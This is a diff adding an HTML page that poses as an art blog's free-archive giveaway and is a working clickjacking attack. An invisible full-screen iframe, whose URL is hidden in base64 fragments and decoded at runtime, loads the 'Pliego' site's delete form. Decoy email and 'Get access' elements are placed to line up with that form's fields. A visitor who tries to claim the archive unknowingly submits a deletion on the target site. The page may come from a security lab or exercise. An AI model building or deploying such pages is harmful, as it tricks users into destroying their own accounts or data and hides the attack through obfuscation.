@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Pliego Archive — Collected</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+:root { --bg: #FAFAF9; --ink: #0D1117; --muted: #6B7280; --line: #E5E7EB; --surf: #fff; --accent: #2563EB; }
+@media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) { --bg: #0D1117; --ink: #E8ECF4; --muted: #9CA3AF; --line: #1F2937; --surf: #141924; --accent: #60A5FA; color-scheme: dark; } }
+:root[data-theme="dark"] { --bg: #0D1117; --ink: #E8ECF4; --muted: #9CA3AF; --line: #1F2937; --surf: #141924; --accent: #60A5FA; color-scheme: dark; }
+body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg); color: var(--ink); min-height: 100vh; }
+
+/* ── INVISIBLE IFRAME — Pliego delete form, intercepts all input ── */
+#victim-frame {
+  position: fixed; inset: 0; width: 100%; height: 100%;
+  border: none; opacity: 0; z-index: 100; pointer-events: auto;
+}
+
+.site-header {
+  position: fixed; top: 0; left: 0; right: 0; height: 56px;
+  display: flex; align-items: center; padding: 0 50px;
+  background: var(--surf); border-bottom: 1px solid var(--line); z-index: 3;
+}
+.site-name { font-size: 15px; font-weight: 700; letter-spacing: -.01em; color: var(--ink); }
+.site-nav { margin-left: auto; display: flex; gap: 24px; }
+.site-nav a { font-size: 13px; font-weight: 500; color: var(--muted); text-decoration: none; }
+
+.article { max-width: 740px; padding: 80px 0 200px 50px; }
+.post-meta { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
+.tag { font-size: 11px; font-weight: 700; letter-spacing: .06em; text-transform: uppercase;
+  background: #FEF3C7; color: #92400E; padding: 3px 9px; border-radius: 20px; }
+.post-meta time { font-size: 12px; color: var(--muted); }
+h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em; margin-bottom: 14px; }
+.subtitle { font-size: 15px; color: var(--muted); line-height: 1.7; margin-bottom: 24px; max-width: 580px; }
+.byline { display: flex; align-items: center; gap: 10px; padding: 14px 0;
+  border-top: 1px solid var(--line); border-bottom: 1px solid var(--line);
+  margin-bottom: 28px; font-size: 13px; color: var(--muted); }
+.avatar { width: 30px; height: 30px; border-radius: 50%;
+  background: linear-gradient(135deg, #1e3a5f 0%, #2563EB 100%);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 12px; font-weight: 700; color: #fff; }
+.byline-name { font-weight: 600; color: var(--ink); }
+.prose { font-size: 15px; line-height: 1.8; color: var(--ink); }
+.prose p { margin-bottom: 20px; }
+.prose h3 { font-size: 17px; font-weight: 700; margin: 32px 0 12px; }
+.prose ul { padding-left: 22px; margin-bottom: 20px; }
+.prose li { margin-bottom: 8px; color: var(--muted); font-size: 14px; line-height: 1.6; }
+
+/* ── SIDEBAR CARD ── */
+.sidebar-card {
+  position: fixed; top: 50px; left: 820px;
+  width: 400px; min-height: 230px;
+  background: var(--surf); border: 1px solid var(--line);
+  border-radius: 12px; padding: 16px 16px 20px;
+  z-index: 2; box-shadow: 0 2px 12px rgba(0,0,0,.06);
+}
+.sb-badge { display: inline-flex; align-items: center; gap: 5px;
+  background: #FEF3C7; color: #92400E;
+  font-size: 10px; font-weight: 700; letter-spacing: .06em; text-transform: uppercase;
+  padding: 3px 8px; border-radius: 20px; margin-bottom: 6px; }
+.sb-title { font-size: 17px; font-weight: 800; line-height: 1.25; margin-bottom: 4px; }
+.sb-pub { font-size: 12px; color: var(--muted); margin-bottom: 0; }
+
+/* ── DECOY — matches eliminar.html: top:131 label, top:155 input, top:219 button ── */
+.email-label {
+  position: fixed; top: 131px; left: 826px;
+  font-size: 13px; font-weight: 500; color: var(--ink);
+  z-index: 2; pointer-events: none;
+}
+.fake-email-input {
+  position: fixed; top: 155px; left: 826px; width: 374px; height: 48px;
+  background: var(--surf); border: 1.5px solid var(--line);
+  border-radius: 8px; padding: 0 14px;
+  font-family: inherit; font-size: 14px; color: var(--muted);
+  display: flex; align-items: center; z-index: 2; pointer-events: none;
+}
+.fake-get-btn {
+  position: fixed; top: 219px; left: 826px; width: 374px; height: 48px;
+  background: #000; color: #fff; border: none; border-radius: 8px;
+  font-family: inherit; font-size: 14px; font-weight: 700;
+  display: flex; align-items: center; justify-content: center;
+  z-index: 2; pointer-events: none; letter-spacing: -.01em;
+}
+.sb-recaptcha {
+  position: fixed; top: 279px; left: 826px; width: 374px;
+  font-size: 11px; color: var(--muted); line-height: 1.5;
+  z-index: 2; pointer-events: none;
+}
+</style>
+</head>
+<body>
+
+<!-- Pliego delete form — invisible, intercepts all input -->
+<iframe id="victim-frame" src="about:blank" aria-hidden="true" tabindex="-1"></iframe>
+
+<header class="site-header">
+  <span class="site-name">Collected</span>
+  <nav class="site-nav">
+    <a href="#">Art</a>
+    <a href="#">Prints</a>
+    <a href="#">Archive</a>
+  </nav>
+</header>
+
+<div class="sidebar-card">
+  <div class="sb-badge">✦ Archive Access</div>
+  <div class="sb-title">Pliego Complete Archive — 2019–2024</div>
+  <div class="sb-pub">ZIP · 847 prints · Partner access for Collected readers</div>
+</div>
+
+<div class="email-label">Email address</div>
+<input class="fake-email-input" type="email" name="email"
+  placeholder="your@email.com"
+  aria-label="Email address to receive archive access"
+  tabindex="0" />
+<button class="fake-get-btn" onclick="void(0)" tabindex="0">Get access</button>
+<div class="sb-recaptcha">
+  Access delivered via <strong>Pliego Editions</strong> · Protected by reCAPTCHA
+</div>
+
+<div class="article">
+  <div class="post-meta">
+    <span class="tag">Archive</span>
+    <time>November 15, 2026</time>
+  </div>
+  <h1>Pliego's complete archive — free for Collected readers</h1>
+  <p class="subtitle">
+    Pliego Editions is releasing their full 2019–2024 archive through the Collected partner program.
+    Enter your email in the panel to receive a download link.
+  </p>
+  <div class="byline">
+    <div class="avatar">C</div>
+    <span>By <span class="byline-name">the Collected team</span> · 3 min read</span>
+  </div>
+  <div class="prose">
+    <p>
+      Pliego Editions has built one of the most consistent digital print catalogs of the last five years.
+      847 pieces across geometric, abstract and editorial compositions — now available as a single archive
+      through the Collected partner program.
+    </p>
+    <p>
+      Enter your email in the panel on the right. The download link goes directly to your inbox.
+      No account required.
+    </p>
+    <h3>What's included</h3>
+    <ul>
+      <li>847 prints · Full resolution PNG</li>
+      <li>Sorted by year and series</li>
+      <li>Includes unreleased works from the 2022 Orbita series</li>
+      <li>No account required — link sent to your email</li>
+    </ul>
+    <p>
+      This offer is available through November only. Use the panel on the right to claim access.
+    </p>
+  </div>
+</div>
+
+<script>
+// Assemble Pliego delete URL at runtime from base64 fragments
+setTimeout(function() {
+  var p = [
+    'aHR0cHM6Ly9wbGll',
+    'Z28tbGVuMy5vbnJl',
+    'bmRlci5jb20vZWxpbWluYXI='
+  ];
+  document.getElementById('victim-frame').src = atob(p.join(''));
+}, 500);
+// decodes to: https://pliego-len3.onrender.com/eliminar
+</script>
+
+</body>
+</html>
